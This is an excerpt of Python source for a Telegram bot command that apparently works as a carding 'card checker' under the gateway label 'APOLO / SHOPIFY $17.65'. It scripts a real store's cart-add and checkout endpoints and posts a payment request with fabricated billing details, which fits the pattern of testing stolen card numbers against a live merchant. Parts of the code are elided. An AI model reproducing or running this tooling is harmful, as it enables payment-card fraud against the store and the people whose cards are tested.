...
@Client.on_message(filters.command("ap", prefixes=['.','/','!','?'], case_sensitive=False) & filters.text)
...
GATEWAY: <code>APOLO</code>
PASARELA: <code>SHOPIFY $17.65</code> </b>""")
...
""")
        ...
        #--------ID DEL PRODUCTO ---------#
        payload_1 = {'id': '17617767923763'}
        
        #-----------PASO N° 2 REEMPLAZAR URL ADD CART-----------#
        req1 = session.post(url=f'https://www.windsorstore.com/cart/add.js', data=payload_1)
        time.sleep(1)
        print("</> PRODUCTO AGREGADO AL CARRIDO")
        
        #-----------PASO N° 3 REEMPLAZAR URL CHECKUOT-----------#
        req3 = session.post(url=f"https://www.windsorstore.com/checkout/")
        ...
        payload_4 = {
            ...
            "payment_session_scope": "www.windsorstore.com"
        }
        ...
        payload_5 = f'_method=patch&authenticity_token={authenticity_token}&previous_step=payment_method&step=&s={id_}&checkout%5Bpayment_gateway%5D=70388318259&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Bdifferent_billing_address%5D=false&checkout%5Bbilling_address%5D%5Bfirst_name%5D=juan&checkout%5Bbilling_address%5D%5Blast_name%5D=perez&checkout%5Bbilling_address%5D%5Baddress1%5D=9701+New+York+Ct&checkout%5Bbilling_address%5D%5Baddress2%5D=&checkout%5Bbilling_address%5D%5Bzip%5D=10080&checkout%5Bbilling_address%5D%5Bcity%5D=Clovis&checkout%5Bbilling_address%5D%5Bphone%5D=%28712%29+291-0111&checkout%5Btotal_price%5D=1765&checkout_submitted_request_url=&checkout_submitted_page_id=ae18609e-BE40-46C9-FDDD-FCD91D2DF235&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=738&checkout%5Bclient_details%5D%5Bbrowser_height%5D=738&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=180'
